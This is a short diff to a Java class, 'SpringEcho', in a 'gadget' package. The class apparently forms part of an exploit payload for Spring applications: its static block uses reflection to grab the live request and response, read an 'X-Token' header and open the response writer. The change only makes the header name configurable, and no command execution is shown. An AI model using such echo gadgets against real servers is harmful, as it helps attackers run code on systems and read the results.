@@ -8,6 +8,8 @@ package com.example.springecho.gadget;
  *  [2.2.x, 2.7.x]
  */
 public class SpringEcho {
+    public static String HEADER = "X-Token";
+
     static {
         try {
             Class clazz = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.RequestContextHolder");
@@ -16,7 +18,7 @@ public class SpringEcho {
             Object request = clazz.getMethod("getRequest").invoke(object);
             Object response = clazz.getMethod("getResponse").invoke(object);
             java.lang.reflect.Method method = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.http.HttpServletRequest").getDeclaredMethod("getHeader", String.class);
-            String header = (String) method.invoke(request, "X-Token");
+            String header = (String) method.invoke(request, HEADER);
             method = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.ServletResponse").getDeclaredMethod("getWriter");
             Object writer = method.invoke(response);
 
